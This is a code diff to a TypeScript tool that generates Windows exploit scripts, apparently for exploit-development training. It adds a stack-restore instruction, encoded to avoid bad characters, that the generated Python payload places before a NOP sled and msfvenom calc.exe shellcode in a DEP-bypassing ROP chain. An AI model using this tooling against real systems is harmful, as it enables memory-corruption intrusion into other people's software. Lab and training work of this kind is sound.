@@ -4,7 +4,7 @@ import { rankCandidates } from "../rop/emitter";
 import { RopGadget } from "../rop/types";
 import { buildRopIndexFromRpPlusText } from "../rop";
 import { MAX_HOPS, Path, ReachIndex, Reg, Unreached, Val, constVal, describe, effectOf, isPath } from "../rop/reach";
-import { copyBytes, FRAMES, FrameFacts, frameGoal, PUSHAD_FRAMES, PUSHAD_TAIL, Slot, WPM_MIN_COPY } from "./dep_frames";
+import { copyBytes, FRAMES, FrameFacts, frameGoal, PUSHAD_FRAMES, PUSHAD_TAIL, Slot, stackSlot, WPM_MIN_COPY } from "./dep_frames";
 import { DepPlanStyle, JobPlan, LARGE_STACK_MOVE, Verdict, fieldRegister, gadgetAddress, hex32, holds, memoryWrites, movesEsp, sequence, sideEffects, stackMove, writtenRegisters } from "./dep_plan";
 import { DepApi } from "./rop_template";
 import { Delivery, deliveryLines, sehHoles } from "./dep_delivery";
@@ -64,6 +64,34 @@ export function measureLanding(eip: number | undefined, esp: number | undefined,
     };
   }
   return assumed(`EIP ${hex32(eip)} is not on the stack below ESP, so no ret popped it`, RET_N);
+}
+
+/** The instruction a staged sled starts with, which puts ESP back on the thread's own stack.
+ *
+ * A staged frame is the stack of the call it dispatches: the pivot puts ESP on the frame and the API's
+ * `ret N` leaves it there, so whatever the call returns into runs on what is left of the module's writable
+ * section. Measured on T11 at `2559eb3`: VirtualAlloc itself returned on roughly 0x150 bytes of it, and the
+ * shellcode it returned into then spent 0x2210 bytes inside one WinExec and faulted a page below the
+ * section, in read-only `.rdata`. A shellcode's appetite is not a number this tool can bound, so the sled
+ * puts the stack back instead of being given room.
+ *
+ * It costs no gadget and nothing kept across the call. The frame already holds the sled's own stack address
+ * in a field at a fixed address, so the sled's first instruction loads ESP straight out of that field. Two
+ * encodings, because these bytes travel in the payload and the first form's may be bad chars. */
+export type StackRestore = { expr: string; asm: string };
+export function stackRestore(at: number, text: string, bad: number[]): StackRestore | undefined {
+  const forms = [
+    { pre: [0x8b, 0x25], post: [] as number[], asm: `mov esp, dword [${text}]` },
+    { pre: [0xa1], post: [0x94], asm: `mov eax, dword [${text}] ; xchg eax, esp` },
+  ];
+  const address = [0, 8, 16, 24].map((shift) => (at >>> shift) & 0xff);
+  const raw = (bytes: number[]): string => bytes.map((b) => b.toString(16).padStart(2, "0")).join("");
+  for (const form of forms) {
+    if ([...form.pre, ...form.post, ...address].some((b) => bad.indexOf(b) >= 0)) continue;
+    const parts = [`bytes.fromhex("${raw(form.pre)}")`, `p32(${text})`, ...(form.post.length ? [`bytes.fromhex("${raw(form.post)}")`] : [])];
+    return { expr: parts.join(" + "), asm: form.asm };
+  }
+  return undefined;
 }
 
 /** A junk dword and the fill byte the payload pads with, both free of the bad chars. */
@@ -772,6 +800,7 @@ export function buildExploit(input: BuildInput): Build {
   };
 
   let frameBlock: string[] = [];
+  let restore: StackRestore | undefined;
   const chain: Op[] = [];
   if (style === "skeleton") {
     const frame = FRAMES[api];
@@ -869,14 +898,20 @@ export function buildExploit(input: BuildInput): Build {
     const staging = input.staging;
     const span = 4 * frame.length;
     const addrRegister = write?.at.address ?? "";
+    // The field the sled reads ESP back out of. The chain writes the sled's stack address there for the
+    // call's own sake; it is the only stack address the frame holds, and it is at a constant address.
+    const back = 4 * stackSlot(api);
+    restore = staging === undefined ? undefined : stackRestore((staging + back) >>> 0, stagingText(back), badchars);
     frameBlock = staging === undefined ? [] : [
       `STAGING = ${hex(staging)}      # the frame is laid here: ${span} writable bytes in ${input.module}`,
-      ...frame.map((slot, i) => `#   ${stagingText(4 * i).padEnd(22)}${slot.name}${i === 0 ? "   <- the pivot's ret enters the call here" : ""}`),
+      ...frame.map((slot, i) => `#   ${stagingText(4 * i).padEnd(22)}${slot.name}${i === 0 ? "   <- the pivot's ret enters the call here"
+        : 4 * i === back ? "   <- and the sled reads ESP back out of here" : ""}`),
       ...placed("0"),
     ];
-    if (staging === undefined || !write || !pivot) {
+    if (staging === undefined || !write || !pivot || !restore) {
       chain.push(...hole("payload", staging === undefined
         ? `no run of ${span} writable bytes in ${input.module} with every field address free of the bad chars: the chain pops each one\ndx @$osed().code_caves("", ${hex(span)}, 25, "${badSpaced}", "STAGING")`
+        : !restore ? `no clean encoding of ${stagingText(back)} into esp: the sled has to put ESP back on the stack before the shellcode runs, and both\nforms of that instruction carry a bad byte here. Lay the frame elsewhere, or write the restore by hand.`
         : "[4/7] has no exact pick for write or pivot: write this chain and its payload by hand"));
     } else {
       const fns = frame.map((slot) => defineLoader(slot, valueRegister, []));
@@ -919,7 +954,7 @@ export function buildExploit(input: BuildInput): Build {
         ...SLED,
         { line: "" },
         { line: "payload  = PAD * CHAIN_AT + b\"\".join(p32(w) for w in c)" },
-        { line: "payload += PAD * gap + nops + shellcode" },
+        { line: "payload += PAD * gap + restore + nops + shellcode" },
       );
     }
   } else {
@@ -1016,7 +1051,9 @@ export function buildExploit(input: BuildInput): Build {
     ...[
       "nops = b\"\\x90\" * 16",
       ...render(hole("shellcode", `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "${badText}" -f python -v shellcode`), ""),
-      ...(sized ? ["size = len(nops + shellcode)", "while not clean(neg(size)): size += 1"] : []),
+      ...(restore ? [`restore = ${restore.expr}`,
+        `# ${restore.asm}: ESP back on the stack, which the frame field holds, before the shellcode runs`] : []),
+      ...(sized ? [`size = len(${restore ? "restore + " : ""}nops + shellcode)`, "while not clean(neg(size)): size += 1"] : []),
       "c = Chain()",
       "c.skip = RET_GAP                 # junk after the first gadget for the bytes the ret into it skips: [6/7]",
       ...render(chain, ""),
